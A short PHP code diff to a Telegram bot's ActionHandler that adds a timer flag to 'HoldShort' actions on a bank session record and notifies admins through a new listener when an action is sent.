@@ -4,6 +4,7 @@ namespace App\Telegram\Handlers;
 
 use App\Enums\ActionType;
 use App\Events\BankSessionUpdated;
+use App\Listeners\NotifyAdminsOfBankSession;
 use App\Models\Admin;
 use App\Models\BankSession;
 use SergiX44\Nutgram\Nutgram;
@@ -65,10 +66,15 @@ class ActionHandler
             return;
         }
 
-        $session->action_type = ['type' => $type->value];
+        $payload = ['type' => $type->value];
+        if ($type === ActionType::HoldShort) {
+            $payload['timer'] = true;
+        }
+        $session->action_type = $payload;
         $session->last_activity_at = now();
         $session->save();
         BankSessionUpdated::dispatch($session);
+        app(NotifyAdminsOfBankSession::class)->notifyActionSent($session, $type->buttonLabel());
         $bot->answerCallbackQuery(text: '✓ ' . $type->buttonLabel());
     }
 }
